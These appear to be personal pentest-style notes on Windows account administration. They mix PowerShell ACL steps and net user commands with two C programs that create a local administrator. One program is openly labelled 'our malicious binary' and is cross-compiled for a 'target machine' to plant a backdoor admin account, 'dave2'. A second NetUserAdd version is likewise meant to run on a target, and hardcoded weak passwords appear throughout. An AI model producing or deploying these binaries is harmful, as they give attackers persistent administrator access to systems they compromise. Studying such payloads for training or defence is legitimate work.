#### Create a user an admin for cmd and powershell only:


###### <span style="color:rgb(0, 176, 240)">Step 1</span>: Create a New Group 
``` powershell
New-LocalGroup -Name "CmdPowerShellUsers" 
```
###### <span style="color:rgb(0, 176, 240)">Step 2</span>: Grant Permissions 
``` powershell
$acl = Get-Acl "C:\Windows\System32\cmd.exe"
$permission = "CmdPowerShellUsers", "ExecuteFile", "Allow"
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$acl.SetAccessRule($accessRule)
Set-Acl "C:\Windows\System32\cmd.exe" $acl
```
###### Repeat the same process for PowerShell executable
``` powershell
$acl = Get-Acl "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$permission = "CmdPowerShellUsers", "ExecuteFile", "Allow"
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$acl.SetAccessRule($accessRule)
Set-Acl "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $acl
```
###### <span style="color:rgb(0, 176, 240)">Step 3</span>: Add User to Group
``` powershell
Add-LocalGroupMember -Group "CmdPowerShellUsers" -Member "Networkadmin"
# display the members of the "CmdPowerShellUsers"
Get-LocalGroupMember -Group "CmdPowerShellUsers"
# Display privileges for cmd.exe
Get-Acl "C:\Windows\System32\cmd.exe" | Format-List
# Display privileges for cmd.exe
Get-Acl "C:\Windows\System32\cmd.exe" | Format-List
# Display privileges for powershell.exe
Get-Acl "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" | Format-List
```

---
---
### Steps to Create an Admin User in CMD:

1. **Open Command Prompt as Administrator**:
    
    - Press `Windows Key + S`, type `cmd`, then right-click on "Command Prompt" and select "Run as administrator."
2. **Create a New User**: Use the following command to create a new user:
    
    ```
    net user <username> <password> /add
    ```
    
    Replace `<username>` with the desired username and `<password>` with the desired password. For example:
    
    ```
    net user AdminUser P@ssw0rd123 /add
    ```
    
3. **Add the User to the Administrators Group**: Use this command to grant the user administrative privileges:
    
    ```
    net localgroup administrators <username> /add
    ```
    
    Example:
    
    ```
    net localgroup administrators AdminUser /add
    ```
    
4. **Verify the User and Permissions** (Optional): To confirm that the user was created and added to the Administrators group, run:
    
    ```
    net user <username>
    ```
    
    and
    
    ```
    net localgroup administrators
    ```
    

### Example Output:

After running the commands:

- The user `AdminUser` will be created with the password `P@ssw0rd123`.
- It will belong to the "Administrators" group, granting it admin rights.
- If you need to **remove** the user later, use:
    
    ```
    net user <username> /delete
    ```

---
A small binary will create a user named dave2 and add that user to the local Administrators group using the system function. The cross-compiled version of this code will serve as our malicious binary. 

``` c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

Since we know that the target machine is 64-bit, we'll cross-compile the C code to a 64-bit application with **x86_64-w64-mingw32-gcc**. In addition, we use **adduser.exe** as argument for **-o** to specify the name of the compiled executable.

``` shell
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

---
### C Code to Create a New User and Add to Administrators Group:

```c
#include <stdio.h>
#include <windows.h>
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

void createAdminUser(const wchar_t *username, const wchar_t *password) {
    USER_INFO_1 userInfo;
    NET_API_STATUS nStatus;
    LOCALGROUP_MEMBERS_INFO_3 groupInfo;

    // Set user information
    userInfo.usri1_name = (LPWSTR)username;
    userInfo.usri1_password = (LPWSTR)password;
    userInfo.usri1_priv = USER_PRIV_USER; // Standard user
    userInfo.usri1_home_dir = NULL;
    userInfo.usri1_comment = NULL;
    userInfo.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    userInfo.usri1_script_path = NULL;

    // Create the user
    nStatus = NetUserAdd(NULL, 1, (LPBYTE)&userInfo, NULL);
    if (nStatus == NERR_Success) {
        wprintf(L"User '%s' created successfully.\n", username);
    } else if (nStatus == NERR_UserExists) {
        wprintf(L"User '%s' already exists.\n", username);
    } else {
        wprintf(L"Failed to create user '%s'. Error: %d\n", username, nStatus);
        return;
    }

    // Add user to Administrators group
    groupInfo.lgrmi3_domainandname = (LPWSTR)username;
    nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&groupInfo, 1);
    if (nStatus == NERR_Success) {
        wprintf(L"User '%s' added to Administrators group successfully.\n", username);
    } else if (nStatus == ERROR_MEMBER_IN_ALIAS) {
        wprintf(L"User '%s' is already in the Administrators group.\n", username);
    } else {
        wprintf(L"Failed to add user '%s' to Administrators group. Error: %d\n", username, nStatus);
    }
}

int main() {
    // Replace with the desired username and password
    const wchar_t *username = L"NewAdminUser";
    const wchar_t *password = L"P@ssw0rd123";

    // Call the function to create the admin user
    createAdminUser(username, password);

    return 0;
}
```

### Instructions to Compile and Use:

1. **Install a C Compiler**:
    
    - Use `gcc` from [MinGW](https://mingw-w64.org/) or Microsoft Visual Studio to compile the code.
``` shell
sudo apt update
sudo apt install mingw-w64
```
1. **Compile the Code**: Save the code as `create_admin.c`, then compile it:
    
    - For GCC (MinGW):
    
```bash
x86_64-w64-mingw32-gcc -o create_admin.exe createAdmin.c -lnetapi32
```

2. **Run the Compiled Executable**: Run the resulting `create_admin.exe` as an administrator on the target machine:
    
    ```cmd
    create_admin.exe
    ```
    
3. **Verify the User**: Check if the user was created and added to the Administrators group using:
    
    ```cmd
    net user
    net localgroup administrators
    ```
    

### Notes:

- This program must run with administrative privileges.
- Use this responsibly and only on systems where you have authorization to make such changes.
- Customize the `username` and `password` variables as needed. Ensure the password complies with your organization's policy.
